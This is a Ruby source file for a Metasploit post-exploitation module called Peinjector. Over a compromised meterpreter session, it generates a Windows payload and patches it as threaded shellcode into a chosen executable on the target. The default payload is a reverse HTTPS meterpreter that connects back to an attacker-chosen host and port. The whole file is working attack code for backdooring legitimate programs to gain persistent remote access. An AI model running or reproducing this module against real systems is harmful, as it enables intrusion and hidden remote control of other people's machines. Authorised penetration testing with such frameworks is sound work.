require 'rex'
require 'msf/core/post/common'

class MetasploitModule < Msf::Post

  include Msf::Post::Common

  def initialize(info={})
    super( update_info( info,
                        'Name'          => 'Peinjector',
                        'Description'   => %q{
        This module will inject a specified windows payload into a target executable.
      },
                        'License'       => MSF_LICENSE,
                        'Author'        => [ 'Maximiliano Tedesco <maxitedesco1@gmail.com>'],
                        'Platform'      => [ 'win' ],
                        'SessionTypes'  => [ 'meterpreter' ]
           ))

    register_options(
        [
            OptString.new('PAYLOAD',   [false, 'Windows Payload to inject into the targer executable.', "windows/meterpreter/reverse_https"]),
            OptAddress.new('LHOST', [true, 'IP of host that will receive the connection from the payload.']),
            OptInt.new('LPORT', [false, 'Port for Payload to connect to.', 4433]),
            OptString.new('TARGETPE',   [false, 'Path of the target executable to be injected']),
            OptString.new('OPTIONS', [false, "Comma separated list of additional options for payload if needed in \'opt=val,opt=val\' format."])
        ]
    )
  end

  # Run Method for when run command is issued
  def run
    session.core.use('peinjector')

    # syinfo is only on meterpreter sessions
    print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?

    # Check that the payload is a Windows one and on the list
    if not  session.framework.payloads.keys.grep(/windows/).include?(datastore['PAYLOAD'])
      print_error("The Payload specified #{datastore['PAYLOAD']} is not a valid for this system")
      return
    end

    # Set variables
    pay_name = datastore['PAYLOAD']
    lhost    = datastore['LHOST']
    lport    = datastore['LPORT']
    targetpe = datastore['TARGETPE']
    opts     = datastore['OPTIONS']

    # Create payload
    payload = create_payload(pay_name, lhost, lport, opts)

    # Inject payload
    inject_payload(payload, targetpe)
  end

  # Create a payload given a name, lhost and lport, additional options
  def create_payload(name, lhost, lport, opts = "")

    pay = client.framework.payloads.create(name)
    pay.datastore['LHOST'] = lhost
    pay.datastore['LPORT'] = lport
    pay.datastore['EXITFUNC'] = 'thread'
    pay.available_space = 1.gigabyte # this is to generate a proper uuid and make the payload to work with the universal handler


    if not opts.blank?
      opts.split(",").each do |o|
        opt,val = o.split("=",2)
        pay.datastore[opt] = val
      end
    end
    # Validate the options for the module
    pay.options.validate(pay.datastore)
    return pay
  end

  def inject_payload(pay, targetpe)

    begin
      print_status("Generating payload")
      raw = pay.generate
      param = {}

      if pay.arch.join == ARCH_X64
        threaded_shellcode = client.peinjector.add_thread_x64(raw)
        param[:isx64] = true
      else
        threaded_shellcode = client.peinjector.add_thread_x86(raw)
        param[:isx64] = false
      end

      param[:shellcode] = threaded_shellcode
      param[:targetpe] = targetpe
      param[:size] = threaded_shellcode.length;

      print_status("Injecting #{pay.name} into the executable #{param[:targetpe]}")
      client.peinjector.inject_shellcode(param)
      print_good("Successfully injected payload into the executable: #{param[:targetpe]}")

    rescue ::Exception => e
      print_error("Failed to Inject Payload to executable #{param[:targetpe]}!")
      print_error(e.to_s)
    end
  end
end
